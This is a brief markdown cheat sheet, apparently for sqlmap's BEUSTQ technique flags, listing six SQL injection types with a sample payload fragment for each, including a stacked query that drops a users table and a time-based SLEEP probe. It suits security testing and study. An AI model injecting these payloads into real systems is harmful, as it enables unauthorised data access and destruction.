
## <span style=color:red></span>
### <font color=red>**BEUSTQ**</font> 
```go
| Options | SQL Injection Types  |              Code              |
| ------- | -------------------- | ------------------------------ |
|   -B    | Boolean-based blind  |            AND 1=1             |
| ------  | -------------------- | ------------------------------ |
|   -E    |     Error-based      |  AND GTID_SUBSET(@@version,0)  |
| ------- | -------------------- | ------------------------------ |
|   -U    |  Union query-based   | UNION ALL SELECT 1,@@version,3 |
| ------- | -------------------- | ------------------------------ |
|   -S    |   Stacked queries    |       ; DROP TABLE users       |
| ------  | -------------------- | ------------------------------ |
|   -T    |   Time-based blind   |    AND 1=IF(2>1,SLEEP(5),0)    |
| ------  | -------------------- | ------------------------------ |
|   -Q    |    Inline queries    | SELECT (SELECT @@version) from |
| ------  | -------------------- | ------------------------------ |
```
